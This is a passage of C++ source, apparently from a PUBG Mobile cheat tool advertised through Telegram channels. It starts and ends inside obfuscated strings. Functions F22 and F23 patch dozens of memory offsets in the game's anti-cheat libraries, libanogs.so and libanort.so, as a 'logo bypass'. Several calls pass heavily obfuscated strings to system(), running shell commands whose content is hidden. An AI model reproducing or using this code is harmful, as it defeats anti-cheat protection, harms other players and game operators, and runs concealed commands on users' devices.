HNf4pJtjTPgz0LMIDqSjGqgRdUfXgUvdfNtXGwvwZU2yHU1dULfyON0jpwgvTIM9HN0dkPE5TUvR1srRUNSvgwfR3zWQ5H0NnPMo0KDAHUfkkH1boPfGSq2I6TtM9"))).c_str());
puts(" https://t.me/IDK_Official 𝕯𝖔𝖓𝖊 [✓]");
system(KILLERQ::KILLERQDE(KILLERQ::KILLERQDE(OBFUSCATE("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"))).c_str());
puts(" https://t.me/IDK_Official  𝕯𝖔𝖓𝖊 [✓]");
puts(" https://t.me/@UU_IDK 𝕯𝖔𝖓𝖊 [✓]");
puts("  LOGO BYPASS 𝕯𝖔𝖓𝖊 [✓]");
close(handle);
}


void F22()
{
CheckPUBGM();
MemoryHandle();
CheckPUBGMRunning();
puts(" LOGO IDK VIP BYPASS FUCK PUBG [✓]");


WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanort.so")) + Offset(AbdullaKassabMakeYouStupid("0x1b3500")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0xAA7F98")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0xAA7F00")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0xAA7EFC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0xAA7EF8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0xAA7EF4")), -763363328);




puts(" https://t.me/IDK_Official [✓]");
puts(" https://t.me/@UU_IDK [✓]");
puts("  LOGO BYPASS [✓]");
close(handle);
}


void F23()
{
CheckPUBGM();
MemoryHandle();
CheckPUBGMRunning();
string aw1 = OBFUSCATE("/data/1");
ofstream MyFile(aw1);
string aw2 = OBFUSCATE("/data/2");
ofstream MyFile2(aw2);
  MyFile << pkg;
  MyFile.close();
  MyFile2 << pak;
  MyFile2.close();
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FC2C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FC30")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FC34")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FC38")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FC5C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FC60")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FC64")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FC68")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FC84")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FC88")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FC8C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FC90")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FF88")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FF8C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FF90")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FF94")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FFB4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FFB8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FFBC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FFC0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FFE0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FFE4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FFE8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x39FFEC")), -763363328);

//////32global

WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0074")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0078")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A007C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0080")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A00A0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A00A4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A00A8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A00AC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A01DC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A01E0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A01E4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A01E8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0210")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0214")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0218")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A021C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A029C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A02A0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A02A4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A02A8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A036C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0370")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0374")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0378")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A03C8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A03CC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A03D0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A03D4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A040C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0410")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0414")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0468")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A046C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0470")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0474")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A049C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A04A0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A04A4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A04A8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A04D0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A04D4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A04D8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A04DC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0640")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0644")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0648")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A064C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0710")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A0718")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A09A0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A09A4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A09A8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x3A09AC")), -763363328);
system(KILLERQ::KILLERQDE(KILLERQ::KILLERQDE(OBFUSCATE("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